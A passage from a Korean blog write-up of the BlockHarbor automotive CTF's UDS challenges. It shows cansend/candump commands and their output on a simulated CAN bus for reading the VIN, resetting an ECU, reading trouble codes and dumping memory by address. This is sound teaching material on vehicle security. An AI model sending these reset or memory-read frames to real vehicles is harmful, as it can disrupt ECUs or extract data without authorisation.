&#xCD94;&#xAC00;&#xD574;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xD6C4; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C;&#xC5D0;&#xB294; &#xD55C; &#xCABD; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C;&#xC11C; &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xC6A9;&#xB3C4;&#xB85C; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>cansend&#xB294; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xB294; &#xB3C4;&#xAD6C;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xC5ED;&#xC2DC; &#xC6D0;&#xD558;&#xB294; CAN &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC55E;&#xC73C;&#xB85C; &#xD480; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xBA54;&#xC2DC;&#xC9C0;&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC124;&#xBA85;&#xD55C; UDS &#xD3EC;&#xB9F7;&#xC5D0; &#xB9DE;&#xCDB0; SID, DID&#xB97C; &#xC798; &#xAD6C;&#xC131;&#xD558;&#xC5EC; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC751;&#xB2F5; &#xB370;&#xC774;&#xD130;&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC778; CAN &#xBA54;&#xC2DC;&#xC9C0; &#xAE38;&#xC774;&#xC778; 8 Byte &#xBCF4;&#xB2E4; &#xD074; &#xACBD;&#xC6B0;&#xB97C; &#xC704;&#xD574;, <code>30000000</code> &#xAC19;&#xC740; Flow Control &#xC694;&#xCCAD;&#xC744; &#xAC19;&#xC774; &#xBCF4;&#xB0B4;&#xC11C; &#xBAA8;&#xB4E0; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC218;&#xC2E0; &#xBC1B;&#xB294; &#xBC29;&#xBC95;&#xB3C4; &#xB9CE;&#xC774; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB807;&#xAC8C; cansend&#xB85C; &#xC804;&#xC1A1;&#xD55C; &#xBA54;&#xC2DC;&#xC9C0;&#xC758; &#xC751;&#xB2F5;&#xC744;, candump&#xB85C; &#xD655;&#xC778;&#xD558;&#xBA70; CAN/UDS &#xD1B5;&#xC2E0; &#xACFC;&#xC815;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="2-Blockharbor-CTF"><a href="#2-Blockharbor-CTF" class="headerlink" title="2. Blockharbor CTF"></a>2. Blockharbor CTF</h2><p><img src="image06.jpg" alt="image06.jpg"></p><p>BlockHarbor CTF&#xB294; &#xC790;&#xB3D9;&#xCC28; &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xD68C;&#xC0AC;&#xC778; Block Harbor&#xC5D0;&#xC11C; &#xB9CC;&#xB4E0; Automotive Capture the Flag(CTF) &#xB300;&#xD68C;&#xC785;&#xB2C8;&#xB2E4;. &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4; &#xD658;&#xACBD;&#xACFC; ECU &#xAC04;&#xC758; &#xD1B5;&#xC2E0; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD574; &#xB193;&#xC558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9; &#xB300;&#xD68C; &#xBB38;&#xC81C;&#xB97C; &#xD1B5;&#xD574; CAN/UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xC2B5;&#xC744; &#xD3B8;&#xB9AC;&#xD558;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB7F0; &#xC7A5;&#xC810;&#xC73C;&#xB85C; &#xCC28;&#xB7C9; &#xD574;&#xD0B9; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xAC00;&#xC7A5; &#xCD94;&#xCC9C;&#xB418;&#xB294; &#xC0AC;&#xC774;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC0AC;&#xC774;&#xD2B8;&#xB294; &#xD06C;&#xAC8C; 2&#xAC1C;&#xB85C; &#xAD6C;&#xC131;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. CTFd &#xD50C;&#xB7AB;&#xD3FC;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xB41C; <a href="https://proving-grounds.blockharbor.io/">CTF &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;</a>&#xC640;, &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xCD95;&#xD55C; <a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a> &#xC0AC;&#xC774;&#xD2B8;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; CAN/UDS &#xBC0F; &#xCC28;&#xB7C9;&#xC5D0; &#xB300;&#xD574; &#xCC98;&#xC74C; &#xC811;&#xD55C;&#xB2E4;&#xBA74;, &#xBB38;&#xC81C; &#xC0AC;&#xC774;&#xD2B8;&#xC5D0;&#xC11C; Getting Started &#xBB38;&#xC81C;&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD558;&#xB294; &#xAC83;&#xC744; &#xAD8C;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image07.png" alt="image07.png"></p><p><a href="https://core.ed.vsec.blockharbor.io/block/learn">VSEC</a>&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xBA74; Other - Learn - SIMULATIONS&#xC5D0;&#xC11C; Proving Grounds&#xC758; &#xC6B0;&#xCE21; &#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD074;&#xB9AD;&#xD558;&#xBA74;, &#xB2E4;&#xC591;&#xD55C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xCC28;&#xB7C9; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC744; &#xC6F9;&#xC73C;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xB9AC;&#xB294; &#xC774;&#xC911;&#xC5D0;&#xC11C; UDS Challenge &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xD480; &#xAC83;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, UDS Challenge&#xC758; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xBB38;&#xC81C;&#xB97C; &#xD47C;&#xB2E4;&#xBA74;, &#xB2E4;&#xB978; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD130;&#xBBF8;&#xB110;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xC5D0; &#xC54C;&#xB9DE;&#xC740; &#xD658;&#xACBD;&#xC744; &#xC774;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image08.png" alt="image08.png"></p><p>&#xD130;&#xBBF8;&#xB110; &#xC544;&#xC774;&#xCF58;&#xC744; &#xD1B5;&#xD574; &#xC811;&#xC18D;&#xD558;&#xBA74; &#xC704;&#xCC98;&#xB7FC; tmux &#xC258;&#xB85C; &#xC811;&#xC18D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD655;&#xC778;&#xD55C; CTF &#xBB38;&#xC81C;&#xB97C; &#xC774; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xD480;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-1-tmux-&#xC124;&#xC815;"><a href="#2-1-tmux-&#xC124;&#xC815;" class="headerlink" title="2.1 tmux &#xC124;&#xC815;"></a>2.1 tmux &#xC124;&#xC815;</h3><p>tmux &#xD130;&#xBBF8;&#xB110; &#xD658;&#xACBD;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370; &#xBA87; &#xAC00;&#xC9C0; tmux &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574;, &#xB354; &#xC88B;&#xC740; &#xBB38;&#xC81C; &#xD480;&#xC774; &#xD658;&#xACBD;&#xC744; &#xAD6C;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; BlockHarbor&#xCE21;&#xC5D0;&#xC11C;&#xB3C4; &#xB79C;&#xB529; &#xD398;&#xC774;&#xC9C0;&#xB97C; &#xD1B5;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC778; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC911; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image09.png" alt="image09.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># Terminal splitting</span>Ctrl + b%<span class="hljs-comment"># Terminal moving</span>Ctrl + b&#x2190; &#x2192;<span class="hljs-comment"># Terminal scroll</span>Ctrl + b[<span class="hljs-comment"># End scroll</span>Ctrl + c</code></pre><p>&#xC704; &#xBA85;&#xB839;&#xC5B4;&#xC640; &#xC124;&#xC815;&#xB4E4;&#xC774; &#xCCB4;&#xAC10; &#xC0C1; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; &#xD130;&#xBBF8;&#xB110; &#xBD84;&#xD560;&#xACFC; &#xC774;&#xB3D9;&#xC774; &#xC790;&#xC8FC; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;. &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xC124;&#xC815;&#xC774;&#xB098; &#xBA85;&#xB839;&#xC5B4;&#xB294; <a href="https://cantreally.cyou/posts/how-i-use-tmux/">tmux &#xC778;&#xD2B8;&#xB85C;</a>&#xB97C; &#xD655;&#xC778;&#xD558;&#xAC70;&#xB098; &#xAC80;&#xC0C9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-UDS-Challenge"><a href="#3-UDS-Challenge" class="headerlink" title="3. UDS Challenge"></a>3. UDS Challenge</h2><p><img src="image10.png" alt="image10.png"></p><p>&#xBB38;&#xC81C; &#xD480;&#xC774;&#xB97C; &#xD560; UDS Challenge&#xB294; UDS &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xB3D9;&#xC791;&#xC744; &#xC218;&#xD589;&#xD558;&#xACE0;, &#xCC28;&#xB7C9; &#xD658;&#xACBD;&#xC744; &#xC81C;&#xC5B4;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xC9C4;&#xD589;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xB294; <a href="https://en.wikipedia.org/wiki/Unified_Diagnostic_Services#Services">SID</a>&#xC640; <a href="https://piembsystech.com/data-identifiers-did-of-uds-protocol-iso-14229/">DID</a>&#xB294; &#xC774;&#xC804;&#xC5D0; &#xC18C;&#xAC1C;&#xD55C; &#xBB38;&#xC11C;&#xB97C; &#xD1B5;&#xD574; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; &#xBB38;&#xC81C;&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;!</p><h3 id="3-1-Simulation-VIN"><a href="#3-1-Simulation-VIN" class="headerlink" title="3.1. Simulation VIN"></a>3.1. Simulation VIN</h3><p><img src="image11.png" alt="image11.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; UDS&#xB97C; &#xD1B5;&#xD574; VIN&#xC744; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>VIN(Vehicle Identification Number)&#xC740; &#xCC28;&#xB7C9; &#xC2DD;&#xBCC4; &#xBC88;&#xD638;&#xB85C;, &#xC55E;&#xC11C; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC124;&#xBA85;&#xD560; &#xB54C; &#xC7A0;&#xAE50; &#xB2E4;&#xB8E8;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC774;&#xAC83;&#xC744; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC870;&#xD68C;&#xD558;&#xBA74; &#xB418;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="image12.png" alt="image12.png"></p><p>&#xBA3C;&#xC800; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA74;, &#xAC00;&#xC0C1; CAN &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC778; vcan0&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; CAN/UDS &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC1A1;&#xC218;&#xC2E0;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="image13.png" alt="image13.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(DLC:len) 22(SID:ReadDataByIdentifier) F190(DID:VIN Data Identifier)</span>cansend vcan0 7DF<span class="hljs-comment">#0322F190 &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>candump&#xB97C; &#xD1B5;&#xD574; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xBC0F; ECU1&#xC5D0; &#xB300;&#xD55C; &#xC1A1;&#xC218;&#xC2E0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC704;&#xD574;, 3&#xAC1C;&#xC758; CAN ID&#xB97C; &#xCD94;&#xAC00;&#xC801;&#xC73C;&#xB85C; &#xB9C8;&#xC2A4;&#xD0B9; &#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; VIN DID &#xBC0F; &#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD; SID&#xB97C; &#xACB0;&#xD569;&#xD558;&#xACE0; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xC751;&#xB2F5;&#xC774; ECU1&#xC5D0;&#xC11C; &#xC624;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; ECU&#xB85C; Flow Control &#xC694;&#xCCAD;&#xAE4C;&#xC9C0; &#xC804;&#xC1A1;&#xD558;&#xBA74; VIN&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xACE0;, flag&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;!</p><pre><code class="hljs angelscript">e66fb3f67ac3:~$ candump -a vcan0,<span class="hljs-number">7E0</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7E8</span>:<span class="hljs-number">7</span>FF,<span class="hljs-number">7</span>DF:<span class="hljs-number">7</span>FF  vcan0  <span class="hljs-number">7</span>DF   [<span class="hljs-number">4</span>]  <span class="hljs-number">03</span> <span class="hljs-number">22</span> F1 <span class="hljs-number">90</span>               <span class="hljs-string">&apos;.&quot;..&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">10</span> <span class="hljs-number">14</span> <span class="hljs-number">62</span> F1 <span class="hljs-number">90</span> <span class="hljs-number">66</span> <span class="hljs-number">6</span>C <span class="hljs-number">61</span>   <span class="hljs-string">&apos;..b..fla&apos;</span>  vcan0  <span class="hljs-number">7E0</span>   [<span class="hljs-number">4</span>]  <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>               <span class="hljs-string">&apos;0...&apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">21</span> <span class="hljs-number">67</span> <span class="hljs-number">7</span>B <span class="hljs-number">76</span> <span class="hljs-number">31</span> <span class="hljs-number">6</span>E <span class="hljs-number">5</span>F <span class="hljs-number">42</span>   <span class="hljs-string">&apos;!g{     &apos;</span>  vcan0  <span class="hljs-number">7E8</span>   [<span class="hljs-number">8</span>]  <span class="hljs-number">22</span> <span class="hljs-number">48</span> <span class="hljs-number">6</span>D <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">68</span> <span class="hljs-number">33</span> <span class="hljs-number">7</span>D   <span class="hljs-string">&apos;&quot;      }&apos;</span></code></pre><p>&#xC218;&#xC2E0; &#xBC1B;&#xC740; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xC138;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC2DD;&#xBCC4;&#xC790; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>22</code>)&#xC744; &#xD558;&#xB2C8;, &#xC62C;&#xBC14;&#xB978; RSID(<code>62</code>) &#xC751;&#xB2F5;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xB7C9;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC751;&#xB2F5; &#xB418;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xB370;&#xC774;&#xD130;&#xB4E4; &#xC55E;&#xC5D0;&#xB294; <code>21</code>, <code>22</code>&#xC640; &#xAC19;&#xC740; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xAC12;&#xC774; &#xD45C;&#xAE30; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC5F0;&#xC18D;&#xC801;&#xC778; &#xB370;&#xC774;&#xD130;&#xC784;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-2-Startup-Message"><a href="#3-2-Startup-Message" class="headerlink" title="3.2. Startup Message"></a>3.2. Startup Message</h3><p><img src="image14.png" alt="image14.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; ECU restart&#xB294; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBB3B;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC9C4;&#xB2E8; &#xC815;&#xBCF4;&#xB97C; <code>7DF</code>&#xB85C; &#xBE0C;&#xB85C;&#xB4DC;&#xCE90;&#xC2A4;&#xD2B8; &#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image15.png" alt="image15.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 02(DLC:len) 11(SID:ECU Reset) 01(SubFunc:Default Session)</span>cansend vcan0 7DF<span class="hljs-comment">#021101</span></code></pre><p>ECU&#xB97C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; Restart&#xB97C; &#xD558;&#xB294; &#xBC29;&#xBC95;&#xC740; &#xBC14;&#xB85C; Reset &#xC694;&#xCCAD;(<code>11</code>)&#xC744; &#xBCF4;&#xB0B4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; Reset &#xC694;&#xCCAD;&#xC758; &#xACBD;&#xC6B0;, &#xAE30;&#xBCF8; &#xC138;&#xC158;(<code>01</code>) Sub Function Byte&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xB54C;&#xBB38;&#xC5D0; &#xBCC4;&#xB3C4;&#xC758; DID&#xB294; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAE30;&#xBCF8; &#xC138;&#xC158;&#xC73C;&#xB85C; ECU Reset &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xBA74;, &#xD574;&#xB2F9; RSID &#xC751;&#xB2F5;(<code>51</code>)&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC73D;&#xACE0; flag &#xC815;&#xBCF4; &#xB610;&#xD55C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h3 id="3-3-Engine-Trouble"><a href="#3-3-Engine-Trouble" class="headerlink" title="3.3. Engine Trouble?"></a>3.3. Engine Trouble?</h3><p><img src="image16.png" alt="image16.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC9C4;&#xB2E8; &#xBB38;&#xC81C; &#xCF54;&#xB4DC;&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; DTC&#xB97C; &#xC77D;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. <code>Pxxxx-xx</code>&#xB77C;&#xB294; DTC &#xD3EC;&#xB9F7; &#xD615;&#xC2DD;&#xC5D0; &#xB9DE;&#xCDB0; flag &#xC778;&#xC99D;&#xC744; &#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image17.png" alt="image17.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 03(DLC:len) 19(SID:ReadDTCInformation) 02(SubFunc:DTCStatusMask) 08(confirmedDTC)</span>cansend vcan0 7DF<span class="hljs-comment">#03190208</span></code></pre><p>DTC &#xC815;&#xBCF4; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>19</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC0C1;&#xD0DC; &#xB9C8;&#xC2A4;&#xD06C;&#xB97C; &#xD1B5;&#xD574; DTC &#xC9C4;&#xB2E8; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC138;&#xBD80;&#xC801;&#xC778; DTC Status Byte&#xB294; <a href="https://buly.kr/2UjxlRq">AUTOSAR &#xBB38;&#xC11C;</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD655;&#xC778;&#xB41C; DTC&#xB294; <code>P3E9F-01</code>&#xC785;&#xB2C8;&#xB2E4;. DTC&#xC758; &#xACBD;&#xC6B0; &#xCC28;&#xB7C9; &#xC9C4;&#xB2E8;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; OBD2&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xD574;&#xB2F9;&#xD558;&#xB294; &#xD45C;&#xC900;&#xC778; <a href="https://piembsystech.com/iso-15031-protocol/">ISO 15031</a> &#xBB38;&#xC11C;&#xB97C; &#xCC38;&#xACE0;&#xD558;&#xBA74; DTC &#xCF54;&#xB4DC; &#xD574;&#xC11D;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-4-Secrets-in-Memory"><a href="#3-4-Secrets-in-Memory" class="headerlink" title="3.4. Secrets in Memory?"></a>3.4. Secrets in Memory?</h3><p><img src="image18.png" alt="image18.png"></p><p>&#xC774; &#xBB38;&#xC81C;&#xB294; &#xC8FC;&#xC18C;&#xC5D0; &#xB300;&#xD55C; &#xC77D;&#xAE30; &#xC694;&#xCCAD;&#xC744; &#xC694;&#xAD6C;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;. &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC740; <code>0xC3F80000</code>&#xBD80;&#xD130; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image19.png" alt="image19.png"></p><pre><code class="hljs bash"><span class="hljs-comment"># listen 7E0, 7E8, 7DF</span>candump -a vcan0,7E0:7FF,7E8:7FF,7DF:7FF<span class="hljs-comment"># 07(DLC:len) 23(SID:ReadMemoryByAddress) 14(AALFId) C3F83000(addr) FF(255 Byte)</span>cansend vcan0 7DF<span class="hljs-comment">#072314C3F83000FF &amp;&amp; cansend vcan0 7E0#30000000</span></code></pre><p>&#xBA54;&#xBAA8;&#xB9AC; &#xC77D;&#xAE30; &#xC694;&#xCCAD;(<code>23</code>)&#xC744; &#xD1B5;&#xD574;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC; &#xB0B4; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC77D;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC5EC;&#xAE30;&#xC11C; &#xC8FC;&#xC758;&#xD560; &#xC810;&#xC740; &#xC8FC;&#xC18C;&#xB97C; &#xC9C0;&#xC815;&#xD558;&#xAE30; &#xC774;&#xC804;&#xC5D0; AddressAndLengthFormatIdentifier(AALFId)&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xAC12;(<code>14</code>)&#xC744; &#xACC4;&#xC0B0;&#xD574;&#xC11C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. AALFId&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xC740; <a href="https://www.youtube.com/watch?v=s2uC4vWMU7Q&amp;t=104s">&#xD574;&#xB2F9; &#xC601;&#xC0C1;</a>&#xC744; &#xCC38;&#xACE0;&#xD558;&#xBA74; &#xC774;&#xD574;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; 4&#xBC14;&#xC774;&#xD2B8; 